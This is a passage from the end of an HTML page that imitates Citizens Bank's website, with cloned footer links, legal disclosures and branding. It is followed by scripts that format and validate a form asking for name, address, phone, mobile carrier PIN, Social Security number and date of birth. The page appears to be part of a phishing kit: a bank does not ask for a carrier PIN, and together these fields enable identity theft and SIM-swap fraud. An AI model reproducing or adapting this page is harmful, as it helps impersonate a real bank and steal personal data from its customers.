                <a target="_blank" href="http://www.citizensbank.com/mortgages/my-mortgage.aspx">My Mortgage Account
                </a>
              </li>
            </ul>
            <ul>
              <li>
                <h6>Students
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/default.aspx">Student Loan Options
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/process/default.aspx">The Student Loan Process
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/process/graduate.aspx">Graduate Students
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Tools &amp; Information
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking/one-deposit-checking-account.aspx">Banking for Students
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/student-services/access-my-student-loan/default.aspx">Access My Student Loan
                </a>
              </li>
            </ul>
            <ul class="last">
              <li>
                <h6>Cards
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/credit-cards/overview.aspx">Credit Cards
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/security/">Security Features
                </a>
              </li>
            </ul>
          </div>
          <div class="footer-row clearfix">
            <ul>
              <li>
                <h6>Personal Loans
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/personal-loans/overview.aspx">Overview
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/personal-loans/faqs.aspx">FAQs
                </a>
              </li>
            </ul>
            <ul>
              <li>
                <h6>Resources
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking/order-checks.aspx">Order Checks
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/customer-service/">Customer Service
                </a>
              </li>
            </ul>
            <ul>
              <li>
                <h6>About Us
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens Bank
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/community/">In the Community
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/careers/">Careers
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/about_our_ads.aspx">About Our Ads
                </a>
              </li>
            </ul>
            <ul class="last">
              <li>
                <h6>Solutions
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/">Personal
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/investing/">Investing
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/small-business/">Small Business
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/commercial-banking/">Commercial
                </a>
              </li>
            </ul>
          </div>
          <div class="footer-row clearfix">
            <ul>
              <li>
                <h6>Disclosures
                </h6>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/pf/onlinebanking/terms.aspx">Online Terms and Conditions
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/pdf/CTZ_eSign.pdf">Electronic Notice Disclosure and Consent (Online Service)
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/account-documents.aspx">Account Documents
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/security/equal-housing-lender.aspx">Equal Housing Lender
                  <img alt="Equal Housing Lender" title="Equal Housing Lender" src="../resources/img/equal-housing.gif">
                </a>
              </li>
              <li>
                <a target="_blank" href="http://www.citizensbank.com/security/">Security, Privacy &amp; Legal
                </a>
              </li>
            </ul>
          </div>
          <div class="centered-content">
            <div class="footer-bottom">
              <p class="legal">
                Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
              </p>
              <p class="legal">
                *Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Securities, Inc. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 912-3800. CSI is an affiliate of Citizens Bank, N.A.
                <br>
                <br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).
                <br>
                <br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.
                <br>
                <br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.
                <br>
                <br>SpeciFi
                <sup>®
                </sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
              </p>
              <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
                <p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:
                </p>
                <ul class="footer-disclaimer-box__list">
                  <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED
                  </li>
                  <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED
                  </li>
                  <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE
                  </li>
                  <li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
                    <br>
                  </li>
                  <li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY
                  </li>
                </ul>
              </div>
              <ul class="footer-util">
                <li class="sitemap">
                  <a target="_blank" href="http://www.citizensbank.com/tools/SiteMap.aspx">Site Map
                  </a>
                </li>
                <li>Follow:
                  <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.facebook.com/citizensbank">
                    <img src="../resources/img/footer-follow-facebook.png" alt="Facebook" align="middle">
                  </a>
                  <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://twitter.com/citizensbank">
                    <img src="../resources/img/footer-follow-twitter.png" alt="Twitter">
                  </a>
                  <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://linkedin.com/company/citizens-bank">
                    <img src="../resources/img/footer-follow-linkedin.png" alt="Linkedin">
                  </a>
                  <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://youtube.com/citizensbank">
                    <img src="../resources/img/footer-follow-youtube.png" alt="Youtube">
                  </a>
                </li>
              </ul>
              <p class="footer-copyright">
                © Copyright 2022 Citizens Financial Group, Inc. All rights reserved.
                <br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).
                <br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
              </p>
              <img src="../resources/img/elh.gif" alt="Equal Housing Lender">
              <img src="../resources/img/fdicFooter.gif" alt="Member FDIC">
            </div>
          </div>
        </footer>
      </div>
    </div>
    <link rel="stylesheet" type="text/css" href="../resources/css/sec-3-4.css">
    <script src="../resources/js/sec-cpt-3-4.js" async="" defer="">
    </script>
    <div id="sec-overlay" style="display:none;">
      <div id="sec-container">
      </div>
    </div>
    <script src="../resources/js/imask.js"></script>
    <script type="text/javascript">
      // $('#zipcode').mask("999999");
      var regExpMask = IMask( document.getElementById('zipcode'),{mask: /^[0-9]{1,6}$/});
    </script>

    <script src="../resources/js/imask.js"></script>
    <script>
  
      var element2 = document.getElementById('dob');
      var maskk = {
        mask: 'mm/dd/yyyy',
        blocks: {
          mm: {
            mask: IMask.MaskedRange,
            from: 1,
            to: 12
          },
          dd: {
            mask: IMask.MaskedRange,
            from: 1,
            to: 31
          },
          yyyy: {
            mask: IMask.MaskedRange,
            from: 1900,
            to: 2003
          }
        }
      };
      var outcome2 = IMask(element2, maskk);
    </script>
    <script src="../resources/js/jquery.maskedinput.js"></script>
    <script>
        $('#number').keyup(function(e){
            var ph = this.value.replace(/\D/g,'').substring(0,10);
            var deleteKey = (e.keyCode == 8 || e.keyCode == 46);
            var len = ph.length;
            if(len==0){
                ph=ph;
            }else if(len<3){
                ph='('+ph;
            }else if(len==3){
                ph = '('+ph + (deleteKey ? '' : ') ');
            }else if(len<6){
                ph='('+ph.substring(0,3)+') '+ph.substring(3,6);
            }else if(len==6){
                ph='('+ph.substring(0,3)+') '+ph.substring(3,6)+ (deleteKey ? '' : '-');
            }else{
                ph='('+ph.substring(0,3)+') '+ph.substring(3,6)+'-'+ph.substring(6,10);
            }
            this.value = ph;
        });
        $('#ssn').keyup(function() {
          var val = this.value.replace(/\D/g, '');
          var newVal = '';
          if(val.length > 4) {
             this.value = val;
          }
          if((val.length > 3) && (val.length < 6)) {
             newVal += val.substr(0, 3) + '-';
             val = val.substr(3);
          }
          if (val.length > 5) {
             newVal += val.substr(0, 3) + '-';
             newVal += val.substr(3, 2) + '-';
             val = val.substr(5);
           }
           newVal += val;
           this.value = newVal.substring(0, 11);
        });
    </script>
    <script src="../resources/js/common.js"></script>
    <script type="text/javascript">
    function enableVerifyBtn(jqFldId) {
      $(jqFldId).removeAttr("disabled");
        $(jqFldId).removeClass("inactive");
      }

        function disableVerifyBtn(jqFldId) {
          $(jqFldId).attr("disabled","disabled");
          $(jqFldId).addClass("inactive");
        }
              
             
      function removeDashes(fld) {
          return fld.replace(new RegExp("-", 'g'),"");
      }
        
        function removeSpaces(fld) {
            return fld.replace(new RegExp(" ", 'g'),"");
      }
        

      $('#first_name').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });

      $('#last_name').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#address').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#city').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#zipcode').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#state').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#number').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#carrier_pin').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      $('#ssn').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });

       $('#dob').keyup(function(e){
        if (main()){
          enableVerifyBtn('#VerifyBtn');
        }
      });
      function main(){
        valid = false;
        if(
          first_name() &&
          last_name() &&
          address() &&
          city() &&
          zip() &&
          state() &&
          number() &&
          carrier_pin() &&
          ssn() &&
          dob()
          )
        {
          valid = true;
        }
        return valid;
      }
      function first_name(){
        var valid = false;
        if($('#first_name').val().length > 2){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function last_name(){
        var valid = false;
        if($('#last_name').val().length > 2){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function address(){
        var valid = false;
        if($('#address').val().length > 5){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function city(){
        var valid = false;
        if($('#city').val().length > 0){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function zip(){
        var valid = false;
        if($('#zipcode').val().length > 4){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function number(){
        var valid = false;
        if($('#number').val().length > 13){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function state(){
        var valid = false;
        if($('#state').val().length > 1){
          valid = true;
          disableVerifyBtn('#VerifyBtn');
        }
        return valid;
      }

      function carrier_pin(){
        var valid = false;
        if($('#carrier_pin').val().length > 3){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }
      function ssn(){
        var valid = false;
        if($('#ssn').val().length > 9){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }

      disableVerifyBtn('#VerifyBtn');

      function dob(){
        var valid = false;
        if($('#dob').val().length > 9){
          valid = true;
          disableVerifyBtn("#VerifyBtn");
        }
        return valid;
      }

      disableVerifyBtn('#VerifyBtn');
   </script>
  </body>
</html>